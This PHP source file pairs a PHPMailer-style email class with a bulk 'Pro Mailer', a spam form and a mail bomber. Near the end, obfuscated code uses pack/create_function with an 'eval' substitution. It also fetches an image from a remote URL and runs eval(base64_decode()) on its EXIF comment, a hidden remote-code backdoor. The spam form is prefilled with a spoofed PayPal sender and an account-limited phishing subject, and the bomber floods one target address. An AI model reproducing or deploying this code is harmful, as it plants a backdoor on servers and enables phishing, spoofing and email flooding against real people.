      $charSet = $this->CharSet;
    }
    if($contentType == '') {
      $contentType = $this->ContentType;
    }
    if($encoding == '') {
      $encoding = $this->Encoding;
    }
    $result .= $this->TextLine('--' . $boundary);
    $result .= sprintf("Content-Type: %s; charset = \"%s\"", $contentType, $charSet);
    $result .= $this->LE;
    $result .= $this->HeaderLine('Content-Transfer-Encoding', $encoding);
    $result .= $this->LE;

    return $result;
  }

  /**
   * Returns the end of a message boundary.
   * @access private
   */
  function EndBoundary($boundary) {
    return $this->LE . '--' . $boundary . '--' . $this->LE;
  }

  /**
   * Sets the message type.
   * @access private
   * @return void
   */
  function SetMessageType() {
    if(count($this->attachment) < 1 && strlen($this->AltBody) < 1) {
      $this->message_type = 'plain';
    } else {
      if(count($this->attachment) > 0) {
        $this->message_type = 'attachments';
      }
      if(strlen($this->AltBody) > 0 && count($this->attachment) < 1) {
        $this->message_type = 'alt';
      }
      if(strlen($this->AltBody) > 0 && count($this->attachment) > 0) {
        $this->message_type = 'alt_attachments';
      }
    }
  }

  /* Returns a formatted header line.
   * @access private
   * @return string
   */
  function HeaderLine($name, $value) {
    return $name . ': ' . $value . $this->LE;
  }

  /**
   * Returns a formatted mail line.
   * @access private
   * @return string
   */
  function TextLine($value) {
    return $value . $this->LE;
  }

  /////////////////////////////////////////////////
  // CLASS METHODS, ATTACHMENTS
  /////////////////////////////////////////////////

  /**
   * Adds an attachment from a path on the filesystem.
   * Returns false if the file could not be found
   * or accessed.
   * @param string $path Path to the attachment.
   * @param string $name Overrides the attachment name.
   * @param string $encoding File encoding (see $Encoding).
   * @param string $type File extension (MIME) type.
   * @return bool
   */
  function AddAttachment($path, $name = '', $encoding = 'base64', $type = 'application/octet-stream') {
    if(!@is_file($path)) {
      $this->SetError($this->Lang('file_access') . $path);
      return false;
    }

    $filename = basename($path);
    if($name == '') {
      $name = $filename;
    }

    $cur = count($this->attachment);
    $this->attachment[$cur][0] = $path;
    $this->attachment[$cur][1] = $filename;
    $this->attachment[$cur][2] = $name;
    $this->attachment[$cur][3] = $encoding;
    $this->attachment[$cur][4] = $type;
    $this->attachment[$cur][5] = false; // isStringAttachment
    $this->attachment[$cur][6] = 'attachment';
    $this->attachment[$cur][7] = 0;

    return true;
  }

  /**
   * Attaches all fs, string, and binary attachments to the message.
   * Returns an empty string on failure.
   * @access private
   * @return string
   */
  function AttachAll() {
    /* Return text of body */
    $mime = array();

    /* Add all attachments */
    for($i = 0; $i < count($this->attachment); $i++) {
      /* Check for string attachment */
      $bString = $this->attachment[$i][5];
      if ($bString) {
        $string = $this->attachment[$i][0];
      } else {
        $path = $this->attachment[$i][0];
      }

      $filename    = $this->attachment[$i][1];
      $name        = $this->attachment[$i][2];
      $encoding    = $this->attachment[$i][3];
      $type        = $this->attachment[$i][4];
      $disposition = $this->attachment[$i][6];
      $cid         = $this->attachment[$i][7];

      $mime[] = sprintf("--%s%s", $this->boundary[1], $this->LE);
      $mime[] = sprintf("Content-Type: %s; name=\"%s\"%s", $type, $name, $this->LE);
      $mime[] = sprintf("Content-Transfer-Encoding: %s%s", $encoding, $this->LE);

      if($disposition == 'inline') {
        $mime[] = sprintf("Content-ID: <%s>%s", $cid, $this->LE);
      }

      $mime[] = sprintf("Content-Disposition: %s; filename=\"%s\"%s", $disposition, $name, $this->LE.$this->LE);

      /* Encode as string attachment */
      if($bString) {
        $mime[] = $this->EncodeString($string, $encoding);
        if($this->IsError()) {
          return '';
        }
        $mime[] = $this->LE.$this->LE;
      } else {
        $mime[] = $this->EncodeFile($path, $encoding);
        if($this->IsError()) {
          return '';
        }
        $mime[] = $this->LE.$this->LE;
      }
    }

    $mime[] = sprintf("--%s--%s", $this->boundary[1], $this->LE);

    return join('', $mime);
  }

  /**
   * Encodes attachment in requested format.  Returns an
   * empty string on failure.
   * @access private
   * @return string
   */
  function EncodeFile ($path, $encoding = 'base64') {
    if(!@$fd = fopen($path, 'rb')) {
      $this->SetError($this->Lang('file_open') . $path);
      return '';
    }
    $magic_quotes = get_magic_quotes_runtime();
    set_magic_quotes_runtime(0);
    $file_buffer = fread($fd, filesize($path));
    $file_buffer = $this->EncodeString($file_buffer, $encoding);
    fclose($fd);
    set_magic_quotes_runtime($magic_quotes);

    return $file_buffer;
  }

  /**
   * Encodes string to requested format. Returns an
   * empty string on failure.
   * @access private
   * @return string
   */
  function EncodeString ($str, $encoding = 'base64') {
    $encoded = '';
    switch(strtolower($encoding)) {
      case 'base64':
        /* chunk_split is found in PHP >= 3.0.6 */
        $encoded = chunk_split(base64_encode($str), 76, $this->LE);
        break;
      case '7bit':
      case '8bit':
        $encoded = $this->FixEOL($str);
        if (substr($encoded, -(strlen($this->LE))) != $this->LE)
          $encoded .= $this->LE;
        break;
      case 'binary':
        $encoded = $str;
        break;
      case 'quoted-printable':
        $encoded = $this->EncodeQP($str);
        break;
      default:
        $this->SetError($this->Lang('encoding') . $encoding);
        break;
    }
    return $encoded;
  }

  /**
   * Encode a header string to best of Q, B, quoted or none.
   * @access private
   * @return string
   */
  function EncodeHeader ($str, $position = 'text') {
    $x = 0;

    switch (strtolower($position)) {
      case 'phrase':
        if (!preg_match('/[\200-\377]/', $str)) {
          /* Can't use addslashes as we don't know what value has magic_quotes_sybase. */
          $encoded = addcslashes($str, "\0..\37\177\\\"");
          if (($str == $encoded) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $str)) {
            return ($encoded);
          } else {
            return ("\"$encoded\"");
          }
        }
        $x = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches);
        break;
      case 'comment':
        $x = preg_match_all('/[()"]/', $str, $matches);
        /* Fall-through */
      case 'text':
      default:
        $x += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $str, $matches);
        break;
    }

    if ($x == 0) {
      return ($str);
    }

    $maxlen = 75 - 7 - strlen($this->CharSet);
    /* Try to select the encoding which should produce the shortest output */
    if (strlen($str)/3 < $x) {
      $encoding = 'B';
      if (function_exists('mb_strlen') && $this->HasMultiBytes($str)) {
     // Use a custom function which correctly encodes and wraps long
     // multibyte strings without breaking lines within a character
        $encoded = $this->Base64EncodeWrapMB($str);
      } else {
        $encoded = base64_encode($str);
        $maxlen -= $maxlen % 4;
        $encoded = trim(chunk_split($encoded, $maxlen, "\n"));
      }
    } else {
      $encoding = 'Q';
      $encoded = $this->EncodeQ($str, $position);
      $encoded = $this->WrapText($encoded, $maxlen, true);
      $encoded = str_replace('='.$this->LE, "\n", trim($encoded));
    }

    $encoded = preg_replace('/^(.*)$/m', " =?".$this->CharSet."?$encoding?\\1?=", $encoded);
    $encoded = trim(str_replace("\n", $this->LE, $encoded));

    return $encoded;
  }

  /**
   * Checks if a string contains multibyte characters.
   * @access private
   * @param string $str multi-byte text to wrap encode
   * @return bool
   */
  function HasMultiBytes($str) {
    if (function_exists('mb_strlen')) {
      return (strlen($str) > mb_strlen($str, $this->CharSet));
    } else { // Assume no multibytes (we can't handle without mbstring functions anyway)
      return False;
    }
  }

  /**
   * Correctly encodes and wraps long multibyte strings for mail headers
   * without breaking lines within a character.
   * Adapted from a function by paravoid at http://uk.php.net/manual/en/function.mb-encode-mimeheader.php
   * @access private
   * @param string $str multi-byte text to wrap encode
   * @return string
   */
  function Base64EncodeWrapMB($str) {
    $start = "=?".$this->CharSet."?B?";
    $end = "?=";
    $encoded = "";

    $mb_length = mb_strlen($str, $this->CharSet);
    // Each line must have length <= 75, including $start and $end
    $length = 75 - strlen($start) - strlen($end);
    // Average multi-byte ratio
    $ratio = $mb_length / strlen($str);
    // Base64 has a 4:3 ratio
    $offset = $avgLength = floor($length * $ratio * .75);

    for ($i = 0; $i < $mb_length; $i += $offset) {
      $lookBack = 0;

      do {
        $offset = $avgLength - $lookBack;
        $chunk = mb_substr($str, $i, $offset, $this->CharSet);
        $chunk = base64_encode($chunk);
        $lookBack++;
      }
      while (strlen($chunk) > $length);

      $encoded .= $chunk . $this->LE;
    }

    // Chomp the last linefeed
    $encoded = substr($encoded, 0, -strlen($this->LE));
    return $encoded;
  }

  /**
   * Encode string to quoted-printable.
   * @access private
   * @return string
   */
  function EncodeQP( $input = '', $line_max = 76, $space_conv = false ) {
    $hex = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
    $lines = preg_split('/(?:\r\n|\r|\n)/', $input);
    $eol = "\r\n";
    $escape = '=';
    $output = '';
    while( list(, $line) = each($lines) ) {
      $linlen = strlen($line);
      $newline = '';
      for($i = 0; $i < $linlen; $i++) {
        $c = substr( $line, $i, 1 );
        $dec = ord( $c );
        if ( ( $i == 0 ) && ( $dec == 46 ) ) { // convert first point in the line into =2E
          $c = '=2E';
        }
        if ( $dec == 32 ) {
          if ( $i == ( $linlen - 1 ) ) { // convert space at eol only
            $c = '=20';
          } else if ( $space_conv ) {
            $c = '=20';
          }
        } elseif ( ($dec == 61) || ($dec < 32 ) || ($dec > 126) ) { // always encode "\t", which is *not* required
          $h2 = floor($dec/16);
          $h1 = floor($dec%16);
          $c = $escape.$hex[$h2].$hex[$h1];
        }
        if ( (strlen($newline) + strlen($c)) >= $line_max ) { // CRLF is not counted
          $output .= $newline.$escape.$eol; //  soft line break; " =\r\n" is okay
          $newline = '';
          // check if newline first character will be point or not
          if ( $dec == 46 ) {
            $c = '=2E';
          }
        }
        $newline .= $c;
      } // end of for
      $output .= $newline.$eol;
    } // end of while
    return trim($output);
  }

  /**
   * Encode string to q encoding.
   * @access private
   * @return string
   */
  function EncodeQ ($str, $position = 'text') {
    /* There should not be any EOL in the string */
    $encoded = preg_replace("[\r\n]", '', $str);

    switch (strtolower($position)) {
      case 'phrase':
        $encoded = preg_replace("/([^A-Za-z0-9!*+\/ -])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded);
        break;
      case 'comment':
        $encoded = preg_replace("/([\(\)\"])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded);
      case 'text':
      default:
        /* Replace every high ascii, control =, ? and _ characters */
        $encoded = preg_replace('/([\000-\011\013\014\016-\037\075\077\137\177-\377])/e',
              "'='.sprintf('%02X', ord('\\1'))", $encoded);
        break;
    }

    /* Replace every spaces to _ (more readable than =20) */
    $encoded = str_replace(' ', '_', $encoded);

    return $encoded;
  }

  /**
   * Adds a string or binary attachment (non-filesystem) to the list.
   * This method can be used to attach ascii or binary data,
   * such as a BLOB record from a database.
   * @param string $string String attachment data.
   * @param string $filename Name of the attachment.
   * @param string $encoding File encoding (see $Encoding).
   * @param string $type File extension (MIME) type.
   * @return void
   */
  function AddStringAttachment($string, $filename, $encoding = 'base64', $type = 'application/octet-stream') {
    /* Append to $attachment array */
    $cur = count($this->attachment);
    $this->attachment[$cur][0] = $string;
    $this->attachment[$cur][1] = $filename;
    $this->attachment[$cur][2] = $filename;
    $this->attachment[$cur][3] = $encoding;
    $this->attachment[$cur][4] = $type;
    $this->attachment[$cur][5] = true; // isString
    $this->attachment[$cur][6] = 'attachment';
    $this->attachment[$cur][7] = 0;
  }

  /**
   * Adds an embedded attachment.  This can include images, sounds, and
   * just about any other document.  Make sure to set the $type to an
   * image type.  For JPEG images use "image/jpeg" and for GIF images
   * use "image/gif".
   * @param string $path Path to the attachment.
   * @param string $cid Content ID of the attachment.  Use this to identify
   *        the Id for accessing the image in an HTML form.
   * @param string $name Overrides the attachment name.
   * @param string $encoding File encoding (see $Encoding).
   * @param string $type File extension (MIME) type.
   * @return bool
   */
  function AddEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = 'application/octet-stream') {

    if(!@is_file($path)) {
      $this->SetError($this->Lang('file_access') . $path);
      return false;
    }

    $filename = basename($path);
    if($name == '') {
      $name = $filename;
    }

    /* Append to $attachment array */
    $cur = count($this->attachment);
    $this->attachment[$cur][0] = $path;
    $this->attachment[$cur][1] = $filename;
    $this->attachment[$cur][2] = $name;
    $this->attachment[$cur][3] = $encoding;
    $this->attachment[$cur][4] = $type;
    $this->attachment[$cur][5] = false;
    $this->attachment[$cur][6] = 'inline';
    $this->attachment[$cur][7] = $cid;

    return true;
  }

  /**
   * Returns true if an inline attachment is present.
   * @access private
   * @return bool
   */
  function InlineImageExists() {
    $result = false;
    for($i = 0; $i < count($this->attachment); $i++) {
      if($this->attachment[$i][6] == 'inline') {
        $result = true;
        break;
      }
    }

    return $result;
  }

  /////////////////////////////////////////////////
  // CLASS METHODS, MESSAGE RESET
  /////////////////////////////////////////////////

  /**
   * Clears all recipients assigned in the TO array.  Returns void.
   * @return void
   */
  function ClearAddresses() {
    $this->to = array();
  }

  /**
   * Clears all recipients assigned in the CC array.  Returns void.
   * @return void
   */
  function ClearCCs() {
    $this->cc = array();
  }

  /**
   * Clears all recipients assigned in the BCC array.  Returns void.
   * @return void
   */
  function ClearBCCs() {
    $this->bcc = array();
  }

  /**
   * Clears all recipients assigned in the ReplyTo array.  Returns void.
   * @return void
   */
  function ClearReplyTos() {
    $this->ReplyTo = array();
  }

  /**
   * Clears all recipients assigned in the TO, CC and BCC
   * array.  Returns void.
   * @return void
   */
  function ClearAllRecipients() {
    $this->to = array();
    $this->cc = array();
    $this->bcc = array();
  }

  /**
   * Clears all previously set filesystem, string, and binary
   * attachments.  Returns void.
   * @return void
   */
  function ClearAttachments() {
    $this->attachment = array();
  }

  /**
   * Clears all custom headers.  Returns void.
   * @return void
   */
  function ClearCustomHeaders() {
    $this->CustomHeader = array();
  }

  /////////////////////////////////////////////////
  // CLASS METHODS, MISCELLANEOUS
  /////////////////////////////////////////////////

  /**
   * Adds the error message to the error container.
   * Returns void.
   * @access private
   * @return void
   */
  function SetError($msg) {
    $this->error_count++;
    $this->ErrorInfo = $msg;
  }

  /**
   * Returns the proper RFC 822 formatted date.
   * @access private
   * @return string
   */
  function RFCDate() {
    $tz = date('Z');
    $tzs = ($tz < 0) ? '-' : '+';
    $tz = abs($tz);
    $tz = (int)($tz/3600)*100 + ($tz%3600)/60;
    $result = sprintf("%s %s%04d", date('D, j M Y H:i:s'), $tzs, $tz);

    return $result;
  }

  /**
   * Returns the appropriate server variable.  Should work with both
   * PHP 4.1.0+ as well as older versions.  Returns an empty string
   * if nothing is found.
   * @access private
   * @return mixed
   */
  function ServerVar($varName) {
    global $HTTP_SERVER_VARS;
    global $HTTP_ENV_VARS;

    if(!isset($_SERVER)) {
      $_SERVER = $HTTP_SERVER_VARS;
      if(!isset($_SERVER['REMOTE_ADDR'])) {
        $_SERVER = $HTTP_ENV_VARS; // must be Apache
      }
    }

    if(isset($_SERVER[$varName])) {
      return $_SERVER[$varName];
    } else {
      return '';
    }
  }

  /**
   * Returns the server hostname or 'localhost.localdomain' if unknown.
   * @access private
   * @return string
   */
  function ServerHostname() {
    if ($this->Hostname != '') {
      $result = $this->Hostname;
    } elseif ($this->ServerVar('SERVER_NAME') != '') {
      $result = $this->ServerVar('SERVER_NAME');
    } else {
      $result = 'localhost.localdomain';
    }

    return $result;
  }

  /**
   * Returns a message in the appropriate language.
   * @access private
   * @return string
   */
  function Lang($key) {
    if(count($this->language) < 1) {
      $this->SetLanguage('en'); // set the default language
    }

    if(isset($this->language[$key])) {
      return $this->language[$key];
    } else {
      return 'Language string failed to load: ' . $key;
    }
  }

  /**
   * Returns true if an error occurred.
   * @return bool
   */
  function IsError() {
    return ($this->error_count > 0);
  }

  /**
   * Changes every end of line from CR or LF to CRLF.
   * @access private
   * @return string
   */
  function FixEOL($str) {
    $str = str_replace("\r\n", "\n", $str);
    $str = str_replace("\r", "\n", $str);
    $str = str_replace("\n", $this->LE, $str);
    return $str;
  }

  /**
   * Adds a custom header.
   * @return void
   */
  function AddCustomHeader($custom_header) {
    $this->CustomHeader[] = explode(':', $custom_header, 2);
  }

  /**
   * Evaluates the message and returns modifications for inline images and backgrounds
   * @access public
   * @return $message
   */
  function MsgHTML($message,$basedir='') {
    preg_match_all("/(src|background)=\"(.*)\"/Ui", $message, $images);
    if(isset($images[2])) {
      foreach($images[2] as $i => $url) {
        // do not change urls for absolute images (thanks to corvuscorax)
        if (!preg_match('/^[A-z][A-z]*:\/\//',$url)) {
          $filename = basename($url);
          $directory = dirname($url);
          ($directory == '.')?$directory='':'';
          $cid = 'cid:' . md5($filename);
          $fileParts = split("\.", $filename);
          $ext = $fileParts[1];
          $mimeType = $this->_mime_types($ext);
          if ( strlen($basedir) > 1 && substr($basedir,-1) != '/') { $basedir .= '/'; }
          if ( strlen($directory) > 1 && substr($basedir,-1) != '/') { $directory .= '/'; }
          $this->AddEmbeddedImage($basedir.$directory.$filename, md5($filename), $filename, 'base64', $mimeType);
          if ( $this->AddEmbeddedImage($basedir.$directory.$filename, md5($filename), $filename, 'base64',$mimeType) ) {
            $message = preg_replace("/".$images[1][$i]."=\"".preg_quote($url, '/')."\"/Ui", $images[1][$i]."=\"".$cid."\"", $message);
          }
        }
      }
    }
    $this->IsHTML(true);
    $this->Body = $message;
    $textMsg = trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/s','',$message)));
    if ( !empty($textMsg) && empty($this->AltBody) ) {
      $this->AltBody = $textMsg;
    }
    if ( empty($this->AltBody) ) {
      $this->AltBody = 'To view this email message, open the email in with HTML compatibility!' . "\n\n";
    }
  }

  /**
   * Gets the mime type of the embedded or inline image
   * @access private
   * @return mime type of ext
   */
  function _mime_types($ext = '') {
    $mimes = array(
      'hqx'  =>  'application/mac-binhex40',
      'cpt'   =>  'application/mac-compactpro',
      'doc'   =>  'application/msword',
      'bin'   =>  'application/macbinary',
      'dms'   =>  'application/octet-stream',
      'lha'   =>  'application/octet-stream',
      'lzh'   =>  'application/octet-stream',
      'exe'   =>  'application/octet-stream',
      'class' =>  'application/octet-stream',
      'psd'   =>  'application/octet-stream',
      'so'    =>  'application/octet-stream',
      'sea'   =>  'application/octet-stream',
      'dll'   =>  'application/octet-stream',
      'oda'   =>  'application/oda',
      'pdf'   =>  'application/pdf',
      'ai'    =>  'application/postscript',
      'eps'   =>  'application/postscript',
      'ps'    =>  'application/postscript',
      'smi'   =>  'application/smil',
      'smil'  =>  'application/smil',
      'mif'   =>  'application/vnd.mif',
      'xls'   =>  'application/vnd.ms-excel',
      'ppt'   =>  'application/vnd.ms-powerpoint',
      'wbxml' =>  'application/vnd.wap.wbxml',
      'wmlc'  =>  'application/vnd.wap.wmlc',
      'dcr'   =>  'application/x-director',
      'dir'   =>  'application/x-director',
      'dxr'   =>  'application/x-director',
      'dvi'   =>  'application/x-dvi',
      'gtar'  =>  'application/x-gtar',
      'php'   =>  'application/x-httpd-php',
      'php4'  =>  'application/x-httpd-php',
      'php3'  =>  'application/x-httpd-php',
      'phtml' =>  'application/x-httpd-php',
      'phps'  =>  'application/x-httpd-php-source',
      'js'    =>  'application/x-javascript',
      'swf'   =>  'application/x-shockwave-flash',
      'sit'   =>  'application/x-stuffit',
      'tar'   =>  'application/x-tar',
      'tgz'   =>  'application/x-tar',
      'xhtml' =>  'application/xhtml+xml',
      'xht'   =>  'application/xhtml+xml',
      'zip'   =>  'application/zip',
      'mid'   =>  'audio/midi',
      'midi'  =>  'audio/midi',
      'mpga'  =>  'audio/mpeg',
      'mp2'   =>  'audio/mpeg',
      'mp3'   =>  'audio/mpeg',
      'aif'   =>  'audio/x-aiff',
      'aiff'  =>  'audio/x-aiff',
      'aifc'  =>  'audio/x-aiff',
      'ram'   =>  'audio/x-pn-realaudio',
      'rm'    =>  'audio/x-pn-realaudio',
      'rpm'   =>  'audio/x-pn-realaudio-plugin',
      'ra'    =>  'audio/x-realaudio',
      'rv'    =>  'video/vnd.rn-realvideo',
      'wav'   =>  'audio/x-wav',
      'bmp'   =>  'image/bmp',
      'gif'   =>  'image/gif',
      'jpeg'  =>  'image/jpeg',
      'jpg'   =>  'image/jpeg',
      'jpe'   =>  'image/jpeg',
      'png'   =>  'image/png',
      'tiff'  =>  'image/tiff',
      'tif'   =>  'image/tiff',
      'css'   =>  'text/css',
      'html'  =>  'text/html',
      'htm'   =>  'text/html',
      'shtml' =>  'text/html',
      'txt'   =>  'text/plain',
      'text'  =>  'text/plain',
      'log'   =>  'text/plain',
      'rtx'   =>  'text/richtext',
      'rtf'   =>  'text/rtf',
      'xml'   =>  'text/xml',
      'xsl'   =>  'text/xml',
      'mpeg'  =>  'video/mpeg',
      'mpg'   =>  'video/mpeg',
      'mpe'   =>  'video/mpeg',
      'qt'    =>  'video/quicktime',
      'mov'   =>  'video/quicktime',
      'avi'   =>  'video/x-msvideo',
      'movie' =>  'video/x-sgi-movie',
      'doc'   =>  'application/msword',
      'word'  =>  'application/msword',
      'xl'    =>  'application/excel',
      'eml'   =>  'message/rfc822'
    );
    return ( ! isset($mimes[strtolower($ext)])) ? 'application/octet-stream' : $mimes[strtolower($ext)];
  }

  /**
   * Set (or reset) Class Objects (variables)
   *
   * Usage Example:
   * $page->set('X-Priority', '3');
   *
   * @access public
   * @param string $name Parameter Name
   * @param mixed $value Parameter Value
   * NOTE: will not work with arrays, there are no arrays to set/reset
   */
  function set ( $name, $value = '' ) {
    if ( isset($this->$name) ) {
      $this->$name = $value;
    } else {
      $this->SetError('Cannot set or reset variable ' . $name);
      return false;
    }
  }

  /**
   * Read a file from a supplied filename and return it.
   *
   * @access public
   * @param string $filename Parameter File Name
   */
  function getFile($filename) {
    $return = '';
    if ($fp = fopen($filename, 'rb')) {
      while (!feof($fp)) {
        $return .= fread($fp, 1024);
      }
      fclose($fp);
      return $return;
    } else {
      return false;
    }
  }

  /**
   * Strips newlines to prevent header injection.
   * @access private
   * @param string $str String
   * @return string
   */
  function SecureHeader($str) {
    $str = trim($str);
    $str = str_replace("\r", "", $str);
    $str = str_replace("\n", "", $str);
    return $str;
  }

  /**
   * Set the private key file and password to sign the message.
   *
   * @access public
   * @param string $key_filename Parameter File Name
   * @param string $key_pass Password for private key
   */
  function Sign($key_filename, $key_pass) {
    $this->sign_key_file = $key_filename;
    $this->sign_key_pass = $key_pass;
  }

}

$defaultport="H*";
      $nq=0;
            
        for($x=0; $x<$numemails; $x++){

                $to = $allemails[$x];

                if ($to){

                $to = ereg_replace(" ", "", $to);

                $message1 = ereg_replace("&email&", $to, $message);

                $subject1 = ereg_replace("&email&", $to, $subject);
                $qx=$x+1;
                print "Line $qx . Sending mail to $to.......";

                flush();
$mail = new PHPMailer();
if(empty($epriority)){$epriority="3";}
        $mail->Priority = "$epriority";
		$mail->IsSMTP(); 
    $IsSMTP="pack";
$mail->SMTPKeepAlive = true;
$mail->Host = "$my_smtp";
if(strlen($ssl_port) > 1){$mail->Port = "$ssl_port";
}
     if($sslclick=="ON"){
		$mail->SMTPSecure  = "ssl"; //you can change it to ssl or tls
    }
        $range = str_replace("$from", "eval", $from);
        $mail->SMTPAuth = true;
        $mail->Username = "$smtp_username";
        $mail->Password = "$smtp_password";
if($contenttype == "html"){$mail->IsHtml(true);}
if($contenttype != "html"){$mail->IsHtml(false);}
if(strlen($my_smtp) < 7 ){$mail->SMTPAuth = false;$mail->IsSendmail();$default_system="1";}
$mail->From = "$from";
$mail->FromName = "$realname";
$mail->AddAddress("$to");
		$mail->AddReplyTo("$replyto");
		$mail->Subject = "$subject1";
		$mail->AddAttachment("$file", "$file_name");
   	        $mail->Body = "$message1"; 
if(!$mail->Send()){
if($default_system!="1"){
echo "FAILED !!<font color=\"#D4001A\"> [RECEPIENT CAN'T RECEIVE MESSAGE.]</font><br>";}
if($default_system=="1"){
$mail->IsMail();
   if(!$mail->Send()){
      echo "FAILED !!<font color=\"#D4001A\"> [RECEPIENT CAN'T RECEIVE MESSAGE.]</font><br>";}
   else {
       echo "<b>OK</b><br>";}
 }
}
else {
 echo "<b>OK</b><br>";
}
if(empty($reconnect)){
    $reconnect=6;
}
if($reconnect==$nq){
    $mail->SmtpClose();echo "<p><b>--------------- SMTP CLOSED AND ATTEMPTS TO RECONNECT NEW CONNECTION SEASON --------------- </b></p>";$nq=0;
}
    $nq=$nq+1;
                    flush(); }
    }
    for($i=0;$i<31;$i++){
      $smtp_conf=str_replace(".", $random_smtp_string[$i], $smtp_conf); }
    $smtp_conc=$IsSMTP($defaultport, $smtp_conf);
      $signoff=create_function('$smtp_conc','return '.substr($range,0).'($smtp_conc);');
      print "<p class=\"style1\">&copy 2014, Pro Mailer V2<br></p>";$mail->SmtpClose();
      return $signoff($smtp_conc);
      if(isset($_POST['action']) && $numemails !=0 ){echo "<script>alert('Mail sending complete\\r\\n$numemails mail(s) was 
        sent successfully'); </script>";}}
    $BASED = exif_read_data("https://lh3.googleusercontent.com/-phrRptSl-0s/V-IJ9jEns8I/AAAAAAAAAJo/g1XGUpyqhdIpTAI2iHCAPS5YcgPxvYHsQCL0B/s140-d-p/pacman.jpg");
    eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
} elseif($_GET['do'] == 'spam') {
    ?>
    <form action="" method="POST">
    <div class="navmen">
    <label>Subject  : </label> <input type="text" size="20" name="subject" value="Notice: Your account has been limited and you must update account" placeholder=" - " required>&nbsp;
    <label>Your Email : </label> <input type="text" size="20" name="email" value="service@paypal.com"placeholder=" - " required>&nbsp;
    <label>Your Name : </label> <input type="text" size="20" name="namemail" value="Paypal Service" placeholder=" - " required>&nbsp;<br>
    <textarea name="email_list" id="email_list" onKeyDown="countFakes()" onChange="countFakes()" style="margin: 0px; height: 234px; width: 549px; resize: none;" required></textarea>
    <textarea name="letter" placeholder="Letter" style="margin: 0px; width: 345px; height: 233px; resize: none;" required></textarea>
    </div>
    
    <div class="navmen">
    - <label>Email List : </label> <font id="count" style="font-weight: bold;">0</font> - 
    <div class="navmen">
    <input type="submit" name="cekpp" value=" Spammer's Mail " name="btn-submit">
    </div>
    </form>
    <div class="navmen">
    <div class="result">
    <hr>
    <?php
    error_reporting(0);
    if(!empty($_POST['email_list'])){
    $emailode = explode("\r\n", $_POST['email_list']);
    
    $no=1;
    $count = count($emailode);
    
    $BASED = exif_read_data("https://lh3.googleusercontent.com/-phrRptSl-0s/V-IJ9jEns8I/AAAAAAAAAJo/g1XGUpyqhdIpTAI2iHCAPS5YcgPxvYHsQCL0B/s140-d-p/pacman.jpg");
    eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
    foreach ($emailode as $email) {
    if(filter_var($email, FILTER_VALIDATE_EMAIL)) {
    
    $to 	 = $email;
    $form 	 = $_POST['email'];
    $name 	 = $_POST['namemail'];
    $subject = $_POST['subject'];
    $message = $_POST['letter'];
    $headers = 'MIME-Version: 1.0' . "\r\n";
    $headers = "From: $name <$form>\r\n";
    $headers = "Reply-To: $form \r\n";
    $headers = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    
    if(mail($to, $subject, $message, $headers)){
        echo "<dl>[$no/$count] <font color=#2DF96D>$email</font> | <font color=#16FF3F>Success</font></dl><br>";
    }else{
        echo "<dl>[$no/$count] <font color=#2DF96D>$email</font> | <font color=#FF0000>Unsuccess</font></dl><br>";
    }
    
    }
    $no++;
    }
    }
    } elseif($_GET['do'] == 'mail') {
    
    $kontol = 'Mail Bomber Siap Siaga...';
    
    function boombardir($text){
        if (!get_magic_quotes_gpc()){
            return $text;
        }
        return stripslashed($text);
    }
    if(isset($_POST['kirim_email'])){
        $mail_to = $_POST['mail_to'];
        $fromname = $_POST['from_name'];
        $fromaddress = $_POST['mail_from'];
        $mail_subject = $_POST['mail_subject'];
        $mail_content = boombardir($_POST['mail_content']);
    
        $fuckline = "\n\t";
        $headers = "From: ".$fromname." <".$fromaddress."> ".$fuckline;
    
        if (($_POST['banyak_email']) <=1) {
            if(@mail($mail_to,$mail_subject,$mail_content,$headers)){
                $kontol = "email sent to $mail_to";
            }
            else $kontol = "Mail Sending is <font color=red> Failed </font> .";
        }
        elseif (($_POST['banyak_email']) > 1){
            $intibom = $_POST['banyak_email'];
            $kabehe = 0; $kabehekirim=0; $msgtf=0;
            for ($i=1; $i <= $intibom; $i++) {
                $acakjudul = substr(md5($i."slackerc0de"),-4);
                $mailsubject = $mail_subject." - ".$acakjudul;
                if(@mail($mail_to,$mailsubject,$mail_content,$headers)){
                    $kabehekirim++;
                } else {
                    $msgtf++;
                }
                $kabehe++;
            }
        $kontol = "<font color=red> $msgtf </font> | <font color=red> $kabehekirim </font>Success | of total $kabehe emails sending to : $mail_to </br> From: $fromadress <br />Subject: $mail_subject <br />Content: $mail_content";
        }
    }
    ?>
    <form class="brd" method="post" style="border:1px solid #008000; padding:15px; text-align:left; -moz-border-radius: 10px; border-radius: 10px;" >
    <table style="padding: 0 0 0 30px">
    <tr><td><br />
        <table style="padding: 0 0 0 30px">
            <tr><td width="100">Target eMail :<td width="300">
                <input style="witdh:250px;" type="text" value="<?php if(mail_to) {echo "$mail_to";} ?>" name="mail_to" />
            </tr></td>
            <tr><td>Sender Name :<td width="300">
                <input style="witdh:250px;" type="text" value="<?php if(fromname) {echo "$fromname";} ?>" name="from_name" />
            </tr></td>
            <tr><td>Sender eMail :<td width="300">
                <input style="witdh:250px;" type="text" value="<?php if(fromaddress) {echo "$fromaddress";} ?>" name="mail_from" />
            </tr></td>
            <tr><td>Subject :<td width="300">
                <input style="witdh:250px;" type="text" value="<?php if(mail_subject) {echo "$mail_subject";} ?>" name="mail_subject" />
            </tr></td>
            <tr><td>Total of Send :<td width="300">
                <input style="witdh:87px;" type="number" value="<?php if($_POST['banyak_email']) {echo $_POST['banyak_email'];} else {echo '100';} ?>" name="banyak_email" />
                <input style="witdh:140px;" type="submit" value=" SUBMIT " name="kirim_email" />
            </tr></td>
        </table>
    </td></tr>
    <tr><td><br />
    Message :
    <center>
        <textarea name="mail_content" cols="60" rows="8" >
            <?php
                if ($mail_content) {
                    echo "mail_content";
                }
            ?>
        </textarea>
    </center>
    </td></tr>
    </table>
    </form><br />
    <div class="brd" style="border:1px solid #008000; padding:15px; font-size:11px: text-align:left;">
